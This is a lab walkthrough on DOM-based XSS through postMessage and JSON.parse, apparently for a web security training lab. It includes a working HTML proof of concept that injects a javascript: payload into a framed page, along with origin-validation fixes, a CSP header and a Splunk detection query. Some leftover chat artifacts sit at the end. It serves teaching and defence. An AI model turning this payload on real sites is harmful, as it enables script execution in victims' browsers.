
# Lab Walkthrough: DOM XSS using Web Messages and JSON.parse

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS) / Logic Flaw
* **Target Context:** Client-Side JavaScript (`postMessage` $\rightarrow$ `JSON.parse` $\rightarrow$ `iframe.src` Sink)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Data Serialization Security Comparison](#4-data-serialization-security-comparison)
5. [Automated Exploitation Script (HTML PoC)](#5-automated-exploitation-script-html-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability demonstrates how the false sense of security provided by structured data (JSON) can mask dangerous DOM routing flaws. The application receives a web message, parses it expecting a specific JSON schema, and uses the resulting object to modify the DOM.

* **The Core Flaw:** The developer successfully implemented structured routing (using `JSON.parse` and a `switch` statement) to handle different message types. However, they completely omitted Origin validation (`e.origin`) and failed to validate the URL schema inside the parsed object before routing it to an execution sink (`iframe.src`).
* **Real-World Analogy:** Imagine a corporate mailroom. The security protocol mandates that all requests must be submitted on a standardized "Form 104-B" (JSON parsing). A malicious actor walks in, fills out Form 104-B perfectly, and checks the box for "Change the CEO's mailing address to my house." The mailroom clerk verifies the form is formatted correctly and processes it without checking the sender's ID.
* **The Sink (`iframe.src`):** When the `src` attribute of an `iframe` is set to a string starting with the `javascript:` pseudo-protocol, the browser executes the JavaScript within the context of the iframe.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   JSON PARSING DOM XSS FLOW                            │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Exploit Page] 
  postMessage('{"type":"load-channel","url":"javascript:print()"}', '*')
           │
           ▼
  [2. Target Listener] Receives string payload. No origin check.
           │
           ▼
  [3. JSON Parsing] JSON.parse(e.data) converts string to JS Object.
           │
           ▼
  [4. Switch Logic] switch (msg.type) { case 'load-channel': ... }
      -> Routes object to the channel loader function.
           │
           ▼
  [5. Sink Execution] iframe.src = msg.url;
      -> Browser executes "javascript:print()".

```

> **Learning Checkpoint 1:** Does `JSON.parse()` inherently prevent XSS? No. `JSON.parse()` simply converts a string into a JavaScript object. It does not sanitize the contents. If a malicious string (like `javascript:print()`) is parsed into a JSON value and then passed to a DOM sink, the code will still execute.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The global `message` event listener on the application's home page.
* **Primary Objective:** Exploit the application's JSON message routing logic to inject a `javascript:` payload into the `src` attribute of an embedded iframe.
* **Validation Signal:** The lab is solved when the exploit successfully calls the `print()` function within the victim's browser.

---

## 3. Step-by-Step Exploitation Flow

Adopt a structured approach to mapping client-side validation logic and identifying bypasses.

* **Phase 1: Reconnaissance & Source Mapping**
* Load the target home page. Open browser Developer Tools (F12) -> **Sources** tab.
* Search the JavaScript files for `addEventListener('message'`.
* *Observation:* The listener captures `e.data`, immediately passes it to `JSON.parse()`, and checks the `.type` property using a `switch` statement.


* **Phase 2: Code Review & Sink Identification**
* Locate the vulnerable switch case:
```javascript
switch(msg.type) {
    case "load-channel":
        var iframe = document.getElementById("ACMEplayer.element");
        iframe.src = msg.url; // <--- SINK
        break;
}

```


* *Analysis:* To reach the sink, our payload must be valid JSON, contain a `type` key set to `"load-channel"`, and contain a `url` key set to our malicious JavaScript payload.


* **Phase 3: Payload Construction & Execution**
* **Drafting the JSON Object:** `{"type": "load-channel", "url": "javascript:print()"}`
* **Escaping for the Exploit Container:** Because we must embed this JSON string inside an HTML attribute (`onload='...'`), the double quotes must be properly escaped (`\"`) to prevent breaking the HTML context.
* **Final Embedded Payload:**
`this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")`
* Navigate to the **Exploit Server**, frame the target application, and trigger the payload via `onload`.



> **Learning Checkpoint 2:** Why must we use `JSON.parse` compliant syntax? `JSON.parse` is extremely strict. Single quotes (`'`) or unquoted keys (e.g., `{type: "load-channel"}`) will throw a `SyntaxError` and halt execution before the payload ever reaches the sink. All keys and string values must use double quotes (`"`).

---

## 4. Data Serialization Security Comparison

How different data parsing methods affect DOM XSS exploitation paths:

| Parsing Method | Strictness | Vulnerability Profile | Exploit Strategy |
| --- | --- | --- | --- |
| `JSON.parse()` | High | Safe from syntax injection, vulnerable to logical routing to sinks. | Deliver perfectly formatted JSON with malicious values mapped to expected keys. |
| `eval()` | None | Highly Critical. Executes arbitrary strings as code. | Direct JavaScript injection. No complex JSON formatting required. |
| `String.split()` | Low | Vulnerable to array index manipulation if routed to sinks. | Inject delimiters (e.g., `,`) to shift payload into the vulnerable array index. |

---

## 5. Automated Exploitation Script (HTML PoC)

This HTML payload is hosted on the attacker's server. It forces the victim to load the vulnerable application and subsequently injects the JSON payload, triggering the routing flaw.

```html
<!DOCTYPE html>
<html>
<head>
    <title>postMessage JSON.parse Routing Exploit</title>
</head>
<body>
    <!-- 1. Frame the vulnerable target application -->
    <!-- 2. Use 'onload' to guarantee the target's listener is ready -->
    <!-- 3. Carefully escape JSON double quotes inside the single-quoted HTML attribute -->
    <iframe 
        src="[https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/)" 
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'
        style="width: 800px; height: 600px; border: none;">
    </iframe>
</body>
</html>

```

*Note: Replace `YOUR-LAB-ID` with your active lab instance URL.*

---

## 6. Defense, Hardening & Secure Coding

To secure Web Messaging that relies on structured JSON routing, developers must enforce strict validation at both the origin boundary and the data property level.

* **Origin Validation (Primary Defense):** Always verify the sender's origin `e.origin` before attempting to parse `e.data`.
```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== "[https://trusted-domain.com](https://trusted-domain.com)") return;
    try {
        let msg = JSON.parse(e.data);
        // Process msg...
    } catch(err) { /* handle error */ }
});

```


* **Protocol Validation for Sinks:** If a JSON property is destined for a navigation sink (`src`, `href`), validate that the URL protocol is safe (`http:`, `https:`).
```javascript
// Secure URL parsing before assignment
let urlObj = new URL(msg.url);
if (urlObj.protocol === "https:") {
    iframe.src = urlObj.href;
}

```



---

## 7. SIEM Detection & Telemetry Analysis

Because DOM-to-DOM messaging occurs entirely client-side, telemetry relies strictly on browser-enforced policies (CSP).

### Client-Side Telemetry (CSP)

Detecting this attack requires a strict Content Security Policy (CSP) blocking inline scripts and unauthorized iframe sources.

* **CSP Configuration:**
```http
Content-Security-Policy: default-src 'self'; child-src 'self' [https://trusted-media.com](https://trusted-media.com); report-uri /csp-violation-endpoint

```


* **Splunk Search Query (Parsing CSP JSON Reports):**
```spl
index=web_application sourcetype=csp_report 
| spath "csp-report.blocked-uri" 
| search "csp-report.blocked-uri"="javascript:*" OR "csp-report.violated-directive"="child-src"
| stats count by src_ip, "csp-report.document-uri"

```



---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Iframe loads, but payload doesn't fire** | Race Condition. | Ensure `postMessage` is triggered *after* the iframe loads using the `onload` attribute. |
| **Console Error: `Uncaught SyntaxError: Unexpected token ' in JSON at position X**` | Invalid JSON syntax. | You used single quotes inside the JSON string (e.g., `{'type':'load-channel'}`). `JSON.parse` requires strict double quotes. |
| **Console Error: `Uncaught SyntaxError: missing ) after argument list**` | HTML Attribute Escaping failure. | You didn't properly escape the double quotes `\"` inside the `onload='...'` attribute, causing the browser to prematurely close the JavaScript function call. |

---

## 9. References & Standards

* [Mozilla Developer Network (MDN): JSON.parse()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse?utm_source=gemini)
* [PortSwigger: DOM-Based Web Message Vulnerabilities](https://www.google.com/search?q=https://portswigger.net/web-security/dom-based/web-messages&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://owasp.org/Top10/A03_2021-Injection/?utm_source=gemini)

```

> **Key Insight:** `JSON.parse()` provides structural safety, not contextual safety. If an application parses JSON but fails to validate the `e.origin` and the URL schema of the extracted properties, it effectively transforms a structured API into a direct conduit for DOM-based code execution.

<FollowUp label="Want to learn how JSON.parse() can lead to Prototype Pollution?" query="Explain how to exploit Prototype Pollution vulnerabilities via JSON.parse() when developers merge JSON objects insecurely, including PoC examples and prevention strategies."/>

```
